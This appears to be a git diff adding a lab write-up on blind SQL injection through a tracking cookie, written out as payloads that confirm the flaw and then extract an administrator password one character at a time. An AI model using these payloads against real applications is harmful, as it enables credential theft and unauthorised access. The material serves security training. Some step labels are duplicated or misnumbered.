@@ -631,60 +631,198 @@ Cool, we have successfully solved this lab.
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cebd199e-fcb5-44c9-a0f9-97a8940ad3e4)
 
-Navigate to the webpage and click on "Gifts"
+So, the application uses a tracking cookie for analytics
 
-![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/15c78331-5e68-4ce9-8a2e-2951430732d0)
+Navigate to the webpage
 
-Capturing the request and sending it over to burp repeater,
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c77d83c7-57c6-47f1-8b96-d1eee6311e30)
 
-![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f77d4c55-9823-446f-9dd5-2afad3995683)
+Click "View details" then capture the request on burpsuite
 
-Since we already know the table name to be ```users``` and the columns in the tables are named ```username``` and ```password```. We also have a username ```administrator```
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e0791be6-76f1-4b3d-a046-964ef73eac0d)
 
-We'll be extracting the password little by little
+Now, lets use conditional responses to check if it is vulnerable to blind SQLi. We can use the queries
+```
+' AND '1'='1
+' AND '1'='2
+```
+Ensure it is url encoded when using it
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ed0b312f-16d3-45cb-afa2-c542203d35d6)
+
+From the above screenshot we got the 'Welcome back!' message, this is because the condition ```'1'='1``` is always true.
+
+Trying the second query
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/912710c8-2b29-4f03-9a30-4391fec44413)
+
+So, this didn't return the 'Welcome back!' message, this is because the condition ```'1'='2``` is always false.
+
+Now, that we have confirmed that it is vulnerable, lets go ahead to obtain the password since we know the table name to be ```users``` and the name of the columns in the tables are ```username``` and ```password```. Also, we have the username to be ```administrator```.
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2690fe5b-55ac-4c47-8df8-e65719fd9f4e)
+
+Based on the hint we were provided, I think we now know what to focus on
+
+To achieve this, we can use the query
+```
+' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 's
+```
+Alright so, we'll be trying the letters all the way from ```a-z```, we'll also try the numbers ```0-9```, until we get a "Welcome back!" message
+
+Trying this query you should get the first character of the password
+```
+' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'p
+```
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cbe640e7-9de5-4c93-b602-5153d527ee1c)
+
+Cool, now that we got the first character, lets go ahead and query for the second character, We can use the query
+```
+' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 2, 1) = 'q
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bf2a6326-efe4-44a3-baeb-b409234a4bb4)
+
+Getting the 3rd character, we can use the query
+```
+' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 3, 1) = 'l
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a431dd64-b56d-4110-b33d-d78dac3d22de)
+
+Getting the 4th character, we can use the query
+```
+' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 4, 1) = '8
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/24c57afa-5628-4c52-9683-b4a5a44c8ea5)
+
+Getting the 5th character, we can use the query
+```
+' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 5, 1) = 'z
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/58770009-2009-4ad7-838c-d6cdc6994fc4)
+
+Getting the 6th character, we can use the query
+```
+' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 6, 1) = 's
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a08b330c-8929-4189-9f1c-b58b05959e06)
+
+Getting the 7th character, we can use the query
+```
+' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 7, 1) = 'm
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0d55d2e0-1f44-4bf5-a015-61f9624e9bc4)
+
+Getting the 7th character, we can use the query
+```
+' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 8, 1) = 'j
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dc6e9cfb-a1db-473d-ae1c-42a8d40f856a)
+
+Getting the 8th character, we can use the query
+```
+' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 8, 1) = 'j
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/41f1714a-cfcc-4c96-bf35-c6f5d458405e)
+
+Getting the 9th character, we can use the query
+```
+' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 9, 1) = 'x
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8aa8b3b9-4588-46ec-80ef-0c010168d0b1)
+
+Getting the 10th character, we can use the query
+```
+' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 10, 1) = 'r
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/62ed9426-e9b8-403c-8b30-cbb75c92a49a)
+
+Getting the 11th character, we can use the query
+```
+' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 11, 1) = '7
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3015b5af-90f7-481d-92d1-b515cb8cdf66)
+
+Getting the 12th character, we can use the query
+```
+' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 12, 1) = 'b
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f2882032-2e5a-4e5d-b193-ff13edae63ed)
+
+Getting the 13th character, we can use the query
+```
+' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 13, 1) = 'i
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/347270ba-c25e-432b-8e97-bff5ca068e0b)
+
+Getting the 14th character, we can use the query
+```
+' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 14, 1) = 'i
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f9d92107-ce88-4444-be44-191d5e9b72ba)
+
+Getting the 15th character, we can use the query
+```
+' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 15, 1) = 'y
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9e906e12-547c-4127-b9c5-fbbaac43cfee)
+
+Getting the 16th character, we can use the query
+```
+' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 16, 1) = 'l
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f591a1c0-a458-4e9b-8b66-88bb421c95a3)
+
+Getting the 17th character, we can use the query
+```
+' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 17, 1) = 'u
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3f78d1c3-c72d-4f15-959b-86a35ff49521)
+
+Getting the 18th character, we can use the query
+```
+' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 18, 1) = 'q
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/31af27ef-2ed1-43ea-b03a-43a11e29f44e)
+
+Getting the 19th character, we can use the query
+```
+' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 19, 1) = 't
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a34f82d5-0e55-43bf-9b2a-20588d7532a6)
 
 
+Getting the 20th character, we can use the query
+```
+' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 20, 1) = 'j
+```
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/01eaccbe-1d05-43c7-82d7-28b4611a75b5)
 
+So we got the final password to be ```pql8zsmjxr7biiyluqtj```. Lets try to login as the administrator user
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c55b62f0-3daa-40b0-9b36-89cc599fc071)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fd66ec16-64e8-4da4-a8c9-4dd8a017244e)
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+Nice, we have successfully solved this lab
 
 
 
